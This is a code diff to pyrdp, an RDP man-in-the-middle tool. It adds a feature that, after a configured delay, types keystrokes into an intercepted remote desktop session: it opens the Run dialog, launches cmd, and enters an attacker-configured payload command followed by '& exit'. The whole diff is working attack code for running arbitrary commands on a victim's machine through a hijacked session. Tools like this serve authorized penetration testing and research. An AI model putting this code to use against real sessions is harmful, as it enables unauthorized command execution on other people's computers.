@@ -10,9 +10,9 @@ import datetime
 from twisted.internet import reactor
 from twisted.internet.protocol import Protocol
 
-from pyrdp.core import AwaitableClientFactory
+from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory
 from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext
-from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, SegmentationPDUType
+from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
 from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, VirtualChannelLayer
 from pyrdp.logging import RC4LoggingObserver
 from pyrdp.logging.adapters import SessionLogger
@@ -243,6 +243,8 @@ class RDPMITM:
         self.client.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.client.fastPath)
         self.server.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.server.fastPath)
 
+        self.sendPayload()
+
     def buildClipboardChannel(self, client: MCSServerChannel, server: MCSClientChannel):
         """
         Build the MITM component for the clipboard channel.
@@ -306,3 +308,33 @@ class RDPMITM:
 
         mitm = VirtualChannelMITM(clientLayer, serverLayer)
         self.channelMITMs[client.channelID] = mitm
+
+    def sendPayload(self):
+        if len(self.config.payload) == 0:
+            return
+
+        if self.config.payloadDelay is None:
+            self.log.error("Payload was set but no delay is configured. Payload will not be sent.")
+            return
+
+        def waitForDelay() -> int:
+            return self.config.payloadDelay
+
+        def openRunWindow() -> int:
+            self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
+            return 50
+
+        def sendCMD() -> int:
+            self.attacker.sendText("cmd")
+            return 50
+
+        def sendEnterKey() -> int:
+            self.attacker.sendKeys([ScanCode.RETURN])
+            return 50
+
+        def sendPayload() -> int:
+            self.attacker.sendText(self.config.payload + " & exit")
+            return 50
+
+        sequencer = AsyncIOSequencer([waitForDelay, openRunWindow, sendCMD, sendEnterKey, sendPayload, sendEnterKey])
+        sequencer.run()
